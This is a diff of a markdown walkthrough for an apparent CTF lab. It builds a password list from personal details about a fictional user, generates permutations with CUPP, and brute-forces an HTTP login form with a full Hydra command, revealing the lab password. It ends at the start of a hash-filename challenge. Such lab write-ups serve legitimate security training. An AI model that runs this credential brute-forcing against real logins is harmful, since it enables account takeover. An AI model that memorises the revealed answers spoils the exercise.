@@ -62,7 +62,7 @@ python3 -c 'from html.parser import HTMLParser; from pathlib import Path; import
 
 This was then cleaned to produce the following list
 
-```
+```md
 Marco
 Bianchi
 marky
@@ -76,3 +76,23 @@ python3 -c 'from itertools import permutations; from pathlib import Path; w=Path
 ```
 
 This list did not work either.
+
+CUPP was used to generate more permutations.
+
+![alt text](<CUPP Settings.png>)
+
+Burp Suite proved too slow to iterate through the list, so Hydra was used instead.
+
+```bash
+hydra -l marco -P marco.txt 10.130.129.254 -s 5003 \
+http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." \
+-t 32 -f -V
+```
+
+This then revealed the password to be `Bianchi2495`
+
+![alt text](HydraScreenshot.png)
+
+### Level 4: Hash Image
+
+> On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco’s uploaded profile picture. Submit only the filename to proceed.
